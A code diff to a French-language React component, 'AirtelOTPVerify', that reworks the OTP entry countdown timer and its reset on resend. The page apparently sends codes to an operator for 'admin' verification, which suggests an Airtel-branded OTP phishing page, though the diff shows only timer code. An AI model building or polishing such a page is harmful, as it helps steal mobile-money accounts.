@@ -10,6 +10,7 @@ const OTP_LENGTH = 4;
 const POLL_FAST_MS = 2000;
 const POLL_SLOW_MS = 5000;
 const POLL_SLOW_AFTER_MS = 60_000;
+const TIMER_START = 45;
 const PENDING_KEY = 'airtelPendingRequest';
 
 function makeRefId() {
@@ -20,13 +21,13 @@ function makeRefId() {
 
 function formatPhone(p: string) {
   if (!p) return 'votre téléphone';
-  // Handles +243 XXX XXX XXX (DRC)
   return p.replace(/(\+\d{3})(\d{3})(\d{3})(\d{3})/, '$1 $2 $3 $4');
 }
 
 function AirtelOTPVerify() {
   const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(''));
-  const [timeLeft, setTimeLeft] = useState(45);
+  const [timeLeft, setTimeLeft] = useState(TIMER_START);
+  const [timerResetKey, setTimerResetKey] = useState(0);
   const [error, setError] = useState('');
   const [expired, setExpired] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
@@ -72,14 +73,23 @@ function AirtelOTPVerify() {
     return () => clearTimeout(t);
   }, [toast]);
 
+  /* ─── Countdown: 45s → 0s, restarts on resend ─── */
   useEffect(() => {
-    if (timeLeft <= 0) {
-      setExpired(true);
-      return;
-    }
-    const timer = setTimeout(() => setTimeLeft((p) => p - 1), 1000);
-    return () => clearTimeout(timer);
-  }, [timeLeft]);
+    if (expired) return;
+
+    const id = setInterval(() => {
+      setTimeLeft((prev) => {
+        if (prev <= 1) {
+          clearInterval(id);
+          setExpired(true);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+
+    return () => clearInterval(id);
+  }, [timerResetKey, expired]);
 
   useEffect(() => stopPolling, [stopPolling]);
 
@@ -270,8 +280,9 @@ function AirtelOTPVerify() {
 
     stopPolling();
     sessionStorage.removeItem(PENDING_KEY);
-    setTimeLeft(45);
+    setTimeLeft(TIMER_START);
     setExpired(false);
+    setTimerResetKey((k) => k + 1);     // ← restart countdown
     setOtp(Array(OTP_LENGTH).fill(''));
     setError('');
     setWaitingForAdmin(false);
@@ -351,13 +362,11 @@ function AirtelOTPVerify() {
 
       <div className="airtel-card">
         {isVerifying ? (
-          /* ---- WAITING FOR ADMIN STATE (spinner + heading only) ---- */
           <div className="airtel-verifying-state">
             <div className="airtel-big-spinner" />
             <h2 className="airtel-otp-heading">Vérification en cours...</h2>
           </div>
         ) : (
-          /* ---- INPUT STATE ---- */
           <>
             <button className="airtel-back-link" onClick={() => navigate('/')}>
               <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
